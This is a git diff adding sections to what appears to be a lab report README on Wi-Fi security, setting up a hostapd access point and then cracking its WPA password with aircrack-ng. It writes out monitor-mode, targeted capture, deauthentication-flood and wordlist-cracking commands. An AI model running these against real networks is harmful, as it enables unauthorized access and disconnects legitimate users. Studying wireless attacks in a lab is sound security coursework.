@@ -63,3 +63,58 @@ Devices per channel
 
 <img src="https://user-images.githubusercontent.com/33444140/230578639-618d3901-e77d-4fd1-b094-968d20a7c089.png">
 
+### Creating an access point with a Wi-Fi encryption standard
+
+Creating our own access point using hostapd service.
+
+`/etc/hostapd/hostapd.conf`
+
+![conf](https://user-images.githubusercontent.com/33444140/230733067-8b523d98-96ab-448f-85bd-2f29c26039fb.png)
+
+Configuring dnsmasq file
+
+`dnsmasq.conf`
+
+![dnsmasq](https://user-images.githubusercontent.com/33444140/230733127-4694657a-5788-46e0-a4b4-7dae67fba1a5.png)
+
+![commands](https://user-images.githubusercontent.com/33444140/230733153-e208dda6-a88c-4d8b-8b7a-e795e45d3f07.png)
+
+The access point is created.
+
+![wifi2](https://user-images.githubusercontent.com/33444140/230733207-1dce2bdd-2293-45e0-af83-78088e8f1ef9.png)
+
+4 way handshake
+
+![handshake](https://user-images.githubusercontent.com/33444140/230733334-2c6286db-afeb-4489-841b-7e286363cadb.png)
+
+### Password cracking tool to crack the Wi-Fi password
+
+ > Airmon-ng is a command-line tool used for monitoring and manipulating wireless network interfaces. It is a part of the Aircrack-ng suite, which is a set of tools used for auditing wireless networks. Airmon-ng is specifically used to enable and disable monitor mode on wireless network interfaces. Monitor mode is a special mode in which a wireless interface can capture all wireless traffic in its range, including packets that are not addressed to it.
+ 
+ `airmon-ng start wlan0`
+ 
+![pwd1](https://user-images.githubusercontent.com/33444140/230733665-d26a6c92-2846-4243-b9d9-c38500916489.png)
+
+Capturing wireless traffic
+
+`airodump -ng wlan0`
+
+![pwd2](https://user-images.githubusercontent.com/33444140/230733672-2eed33d6-65e1-4cf1-bc57-48e9444b0eea.png)
+
+Focusing airodump-ng on one access point and one channel
+
+`airodump-ng --bssid <id>  -c <channel no> --write <filename> wlan0`
+
+![pwd3](https://user-images.githubusercontent.com/33444140/230733682-fb845fa4-f6fd-4265-bb54-7f5b24eaf4e1.png)
+
+aireplay-ng deauth
+
+`aireplay-ng --deauth 100 -a <id> wlan0`
+
+![pwd4](https://user-images.githubusercontent.com/33444140/230733693-72e01e3a-cdf5-4a22-a80e-93df0c11bc89.png)
+
+`aircrack-ng WPAcrack-03.cap  -w /usr/share/wordlists/rockyou.txt`
+
+![pswdfile](https://user-images.githubusercontent.com/33444140/230734389-ec9bb31c-b53c-4feb-b6ea-e3dd899f3558.png)
+
+### Protocol level working of WPA3 and how it differs from WPA2
